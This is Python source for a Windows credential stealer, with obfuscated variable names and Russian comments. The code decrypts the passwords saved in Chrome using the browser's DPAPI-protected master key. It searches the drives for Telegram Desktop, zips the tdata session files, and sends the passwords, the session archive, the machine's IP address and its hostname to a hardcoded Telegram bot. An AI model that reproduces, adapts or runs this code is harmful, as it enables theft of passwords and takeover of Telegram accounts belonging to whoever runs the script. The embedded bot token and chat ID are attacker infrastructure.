try :#line:1
    import socket #line:2
    from telebot import TeleBot #line:3
    import shutil #line:4
    import json #line:5
    from base64 import b64decode #line:6
    from win32crypt import CryptUnprotectData #line:7
    from Crypto .Cipher import AES #line:8
    import os #line:9
    import sqlite3 #line:10
    import win32api #line:11
    from zipfile import ZipFile #line:12
except Exception as e :#line:13
    print ("ERROR importing: "+repr (e ))#line:14
    pass #line:15
bt_tkn ='5982347969:AAFNqM55gteFIBVR23r4nmodzOA8V-dnzlo'#line:18
cht_id ='1468931744'#line:21
def gt_ip_hstn ():#line:24
    try :#line:25
        OOO0O0O0O000000OO =socket .gethostbyname (socket .gethostname ())#line:26
        O00000O0O00OOO0O0 =socket .gethostname ()#line:27
        return OOO0O0O0O000000OO ,O00000O0O00OOO0O0 #line:28
    except Exception as O0000O0OO00O00000 :#line:29
        return None ,str (O0000O0OO00O00000 )#line:30
def snd_msg (O0OO00O0O0OO0000O ,OO000OOO0OOO0OOO0 ):#line:33
    try :#line:34
        O0OO00O0000OO0OOO =TeleBot (token =bt_tkn )#line:35
        O0OO00O0000OO0OOO .send_message (chat_id =O0OO00O0O0OO0000O ,text =OO000OOO0OOO0OOO0 )#line:36
    except Exception as OO0000OOO0O000000 :#line:37
        print (f"Ошибка при отправке сообщения: {str ( OO0000OOO0O000000 )}")#line:38
def mn ():#line:41
    OO0O0000000OOOO00 ,O0O00OOO0OO0OO000 =gt_ip_hstn ()#line:42
    if OO0O0000000OOOO00 and O0O00OOO0OO0OO000 :#line:43
        OO000O000OOOOO0OO =f"IP-адрес компьютера: {OO0O0000000OOOO00}\nИмя компьютера: {O0O00OOO0OO0OO000}"#line:44
        snd_msg (cht_id ,OO000O000OOOOO0OO )#line:45
    else :#line:46
        print ("Не удалось получить IP-адрес и имя компьютера.")#line:47
if __name__ =="__main__":#line:50
    mn ()#line:51
lg_out =0 #line:53
usr_id =1468931744 #line:55
tkn ='5982347969:AAFNqM55gteFIBVR23r4nmodzOA8V-dnzlo'#line:56
nm_ur_txt ='pass.txt'#line:57
bt =TeleBot (tkn )#line:60
pth_usr =os .path .expanduser ('~')#line:61
lcl =os .getenv ("LOCALAPPDATA")#line:62
tmp =os .path .join (lcl ,"Temp")#line:63
ttmp =os .path .join (lcl ,"Temp","tdata")#line:64
pths =['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\','I:\\','J:\\']#line:66
pth =os .path .expandvars (r'%LocalAppData%\Google\Chrome\User Data\Local State')#line:67
def gt_mstr_key ():#line:70
    try :#line:71
        with open (pth ,encoding ="utf-8")as O000OOOOO0OO00OO0 :#line:72
            O000O0O0OOOOO0000 =json .load (O000OOOOO0OO00OO0 )["os_crypt"]["encrypted_key"]#line:73
            O0O0OO0OO0O0OO00O =b64decode (O000O0O0OOOOO0000 )#line:74
            O0O0OO0OO0O0OO00O =O0O0OO0OO0O0OO00O [5 :]#line:75
            O0O0OO0OO0O0OO00O =CryptUnprotectData (O0O0OO0OO0O0OO00O ,None ,None ,None ,0 )[1 ]#line:76
            return O0O0OO0OO0O0OO00O #line:77
    except :#line:78
        print ("ERROR: couldn't access the masterkey")#line:79
        pass #line:80
def dcrptn (O0OOOOO0OO0O00O00 ,O00000O00O0OO00O0 ):#line:83
    try :#line:84
        OO0OO0OOOO0O0OOO0 =O0OOOOO0OO0O00O00 [15 :]#line:85
        OOOOO0O00O00OO0O0 =O0OOOOO0OO0O00O00 [3 :15 ]#line:86
        OO00OOO0OOO0O000O =AES .new (O00000O00O0OO00O0 ,AES .MODE_GCM ,OOOOO0O00O00OO0O0 )#line:87
        OO00OOO000O0O000O =OO00OOO0OOO0O000O .decrypt (OO0OO0OOOO0O0OOO0 )#line:88
        OO00OOO000O0O000O =OO00OOO000O0O000O [:-16 ].decode ()#line:89
        return OO00OOO000O0O000O #line:90
    except Exception as OO00OO0000OO0O0O0 :#line:91
        print ("ERROR in decryption: "+repr (OO00OO0000OO0O0O0 ))#line:92
def Chrme ():#line:95
    O00O0OOOO000O0000 ='YOUR PASSWORDS\n'#line:96
    try :#line:97
        if os .path .exists (os .getenv ("LOCALAPPDATA")+'\\Google\\Chrome\\User Data\\Default\\Login Data'):#line:98
            shutil .copy2 (os .getenv ("LOCALAPPDATA")+'\\Google\\Chrome\\User Data\\Default\\Login Data',os .getenv ("LOCALAPPDATA")+'\\Google\\Chrome\\User Data\\Default\\Login Data2')#line:100
            O00OOOOOO00OO0000 =sqlite3 .connect (os .getenv ("LOCALAPPDATA")+'\\Google\\Chrome\\User Data\\Default\\Login Data2')#line:101
            OO00000OO00O0O000 =O00OOOOOO00OO0000 .cursor ()#line:102
            OO00000OO00O0O000 .execute ('SELECT action_url, username_value, password_value FROM logins')#line:103
            for OOOO00O00OO00OO00 in OO00000OO00O0O000 .fetchall ():#line:104
                OO00OOOOOOOOO00OO =OOOO00O00OO00OO00 [2 ]#line:105
                OOOO0OO00OOO0O0OO =OOOO00O00OO00OO00 [1 ]#line:106
                O00000000O0O00OO0 =OOOO00O00OO00OO00 [0 ]#line:107
                OOO0OOO00O0O00000 =dcrptn (OO00OOOOOOOOO00OO ,gt_mstr_key ())#line:108
                O00O0OOOO000O0000 +=O00000000O0O00OO0 +' | '+OOOO0OO00OOO0O0OO +' | '+OOO0OOO00O0O00000 +'\n'#line:109
                with open (nm_ur_txt ,"w",encoding ="utf-8")as O0O00OO00000O0O00 :#line:110
                    O0O00OO00000O0O00 .write (O00O0OOOO000O0000 )#line:111
    except Exception as OO0OOO0O0OO0O0OOO :#line:112
        print ("ERROR in Chrme() func: "+repr (OO0OOO0O0OO0O0OOO ))#line:113
        pass #line:114
def fnddir (O000OOO0000000000 ):#line:117
    for O000O0000OOOOO000 ,O00OOO0O0OO00OOOO ,O00OO0OOO0OO00OO0 in os .walk (O000OOO0000000000 ):#line:118
        for O00O0O0O0O0O0OO0O in O00OOO0O0OO00OOOO :#line:119
            if O00O0O0O0O0O0OO0O =="Telegram Desktop":#line:120
                O00000O000OO0O0OO =os .path .join (O000O0000OOOOO000 ,O00O0O0O0O0O0OO0O )#line:121
                print ("***Checking folder: "+O00000O000OO0O0OO )#line:122
                if os .path .exists (O00000O000OO0O0OO +'\\Telegram.exe'):#line:123
                    print ("***OK Telegram Desktop has been found")#line:124
                    return O00000O000OO0O0OO #line:125
                else :#line:126
                    print ("ERROR: ^ this is not an actual TG folder. Continuing...")#line:127
                    pass #line:128
def get_file_props (OO0OO00O00000O0OO ):#line:130
    O0OO00O00OO0OO0OO ={'FileVersion':None }#line:131
    try :#line:132
        OOOO0O0OO0OO0O000 =win32api .GetFileVersionInfo (OO0OO00O00000O0OO ,'\\')#line:133
        O0OO00O00OO0OO0OO ['FileVersion']="%d.%d.%d.%d"%(OOOO0O0OO0OO0O000 ['FileVersionMS']/65536 ,OOOO0O0OO0OO0O000 ['FileVersionMS']%65536 ,OOOO0O0OO0OO0O000 ['FileVersionLS']/65536 ,OOOO0O0OO0OO0O000 ['FileVersionLS']%65536 )#line:136
    except Exception as O00O00OOOO00OOOOO :#line:137
        print (repr (O00O00OOOO00OOOOO ))#line:138
        pass #line:139
    return O0OO00O00OO0OO0OO #line:140
def lgout_win (O00O000O00OOOO000 ):#line:143
    if O00O000O00OOOO000 :#line:144
        try :#line:145
            global pthd877 #line:146
            os .system ('taskkill /f /im Telegram.exe')#line:147
            os .remove (pthd877 )#line:148
        except Exception as O0000O000OOO0O000 :#line:149
            print ("ERROR: Failed to logout: "+repr (O0000O000OOO0O000 ))#line:150
            pass #line:151
    else :#line:152
        print ("***Logout state is 0")#line:153
        pass #line:154
def snd_txt ():#line:157
    try :#line:158
        bt .send_document (usr_id ,open (nm_ur_txt ,'rb'))#line:159
        os .remove (nm_ur_txt )#line:160
        print ("***OK Passwords have been sended successfully")#line:161
    except Exception as OO00OO00OOO0O0OOO :#line:162
        print ("ERROR in snd_txt() func: "+repr (OO00OO00OOO0O0OOO ))#line:163
        pass #line:164
def snd_sssn_files (OOOOO00OOO0O0OOOO ):#line:169
    O0000O0000000OO00 =get_file_props (os .path .join (OOOOO00OOO0O0OOOO [:-5 ],"Telegram.exe"))["FileVersion"]#line:170
    try :#line:171
        os .mkdir (ttmp )#line:172
        print ("good")#line:173
    except :#line:174
        print ("err")#line:175
    for O0O00OOO0OO000000 ,OO00OOO0O0000O000 ,OOOO0OO0000O0OOO0 in os .walk (OOOOO00OOO0O0OOOO ):#line:176
        for O00OO00000O0OOOO0 in OO00OOO0O0000O000 :#line:177
            if O00OO00000O0OOOO0 [0 :15 ]=="D877F783D5D3EF8":#line:178
                OOO0OO0000O00O000 =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00000O0OOOO0 )#line:179
                try :#line:180
                    os .mkdir (os .path .join (ttmp ,O00OO00000O0OOOO0 ))#line:181
                except :#line:182
                    pass #line:183
                if os .path .exists (os .path .join (O0O00OOO0OO000000 ,O00OO00000O0OOOO0 ,'maps')):#line:184
                    shutil .copy2 (os .path .join (OOO0OO0000O00O000 ,'maps'),(os .path .join (ttmp ,O00OO00000O0OOOO0 ,"maps")))#line:185
            elif O00OO00000O0OOOO0 [0 :15 ]=="A7FDF864FBC10B7":#line:186
                OOO0OO0000O00O000 =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00000O0OOOO0 )#line:187
                try :#line:188
                    os .mkdir (os .path .join (ttmp ,O00OO00000O0OOOO0 ))#line:189
                except :#line:190
                    pass #line:191
                if os .path .exists (os .path .join (O0O00OOO0OO000000 ,O00OO00000O0OOOO0 ,'maps')):#line:192
                    shutil .copy2 (os .path .join (OOO0OO0000O00O000 ,'maps'),(os .path .join (ttmp ,O00OO00000O0OOOO0 ,"maps")))#line:193
            elif O00OO00000O0OOOO0 [0 :15 ]=="F8806DD0C461824":#line:194
                OOO0OO0000O00O000 =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00000O0OOOO0 )#line:195
                try :#line:196
                    os .mkdir (os .path .join (ttmp ,O00OO00000O0OOOO0 ))#line:197
                except :#line:198
                    pass #line:199
                if os .path .exists (os .path .join (O0O00OOO0OO000000 ,O00OO00000O0OOOO0 ,'maps')):#line:200
                    shutil .copy2 (os .path .join (OOO0OO0000O00O000 ,'maps'),(os .path .join (ttmp ,O00OO00000O0OOOO0 ,"maps")))#line:201
        for O00OO00OO00O0000O in OOOO0OO0000O0OOO0 :#line:202
            if O00OO00OO00O0000O [0 :15 ]=="D877F783D5D3EF8":#line:203
                OOO00OO0O0OO0O00O =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00OO00O0000O )#line:204
                shutil .copy2 (OOO00OO0O0OO0O00O ,(os .path .join (ttmp ,O00OO00OO00O0000O )))#line:205
            elif O00OO00OO00O0000O [0 :15 ]=="A7FDF864FBC10B7":#line:206
                OOO00OO0O0OO0O00O =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00OO00O0000O )#line:207
                shutil .copy2 (OOO00OO0O0OO0O00O ,(os .path .join (ttmp ,O00OO00OO00O0000O )))#line:208
            elif O00OO00OO00O0000O [0 :15 ]=="F8806DD0C461824":#line:209
                OOO00OO0O0OO0O00O =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00OO00O0000O )#line:210
                shutil .copy2 (OOO00OO0O0OO0O00O ,(os .path .join (ttmp ,O00OO00OO00O0000O )))#line:211
            elif O00OO00OO00O0000O =="key_datas":#line:212
                O0O00O0OOO00O0O00 =os .path .join (OOOOO00OOO0O0OOOO ,O00OO00OO00O0000O )#line:213
                shutil .copy2 (O0O00O0OOO00O0O00 ,(os .path .join (ttmp ,O00OO00OO00O0000O )))#line:214
    with ZipFile (os .path .join (tmp ,'tdata.zip'),'w')as O00000O00O00OOOOO :#line:215
        for O0O00OO000O000000 ,OO0OO00OO00OOOOO0 ,OO0O00000000OO0O0 in os .walk (ttmp ):#line:216
            for O00OOO00000O00O0O in OO0O00000000OO0O0 :#line:217
                OOOOOO000O00O0000 =os .path .join (O0O00OO000O000000 ,O00OOO00000O00O0O )#line:218
                O00000O00O00OOOOO .write (OOOOOO000O00O0000 )#line:219
    if OOOOO00OOO0O0OOOO is not None :#line:220
        O0OOOOOO0O0OOOO0O =f"{OOOOO00OOO0O0OOOO}\nVersion: {O0000O0000000OO00}"#line:221
        bt .send_document (usr_id ,open (os .path .join (tmp ,'tdata.zip'),'rb'),caption =O0OOOOOO0O0OOOO0O )#line:222
    else :#line:223
        print ("ERROR: Путь является None.")#line:224
if os .path .exists (pth_usr +'\\AppData\\Roaming\\Telegram Desktop'):#line:227
    tddir =(pth_usr +'\\AppData\\Roaming\\Telegram Desktop\\')#line:228
    tdata_pth =(pth_usr +'\\AppData\\Roaming\\Telegram Desktop\\tdata')#line:229
    print ("***OK Default TG folder has been found")#line:230
    snd_sssn_files (tdata_pth )#line:231
else :#line:232
    print ("ERROR: Telegram folder is not default. Continuing...")#line:233
for i in pths :#line:235
    found =fnddir (i )#line:236
    if found !=None and found !=(pth_usr +'\\AppData\\Roaming\\Telegram Desktop'):#line:237
        tddir =found #line:238
        tdata_pth =(os .path .join (tddir ,"tdata"))#line:239
        snd_sssn_files (tdata_pth )#line:240
def mn ():#line:243
    try :#line:244
        Chrme ()#line:245
        bt .send_message (usr_id ,pth_usr )#line:246
        snd_txt ()#line:247
        lgout_win (lg_out )#line:248
    except Exception as OOOO00O0OO00OO0OO :#line:249
        print ('ERROR: Main function: '+repr (OOOO00O0OO00OO0OO ))#line:250
        pass #line:251
if __name__ =='__main__':#line:254
    mn ()#line:255
    print ("***Finished***")#line:256
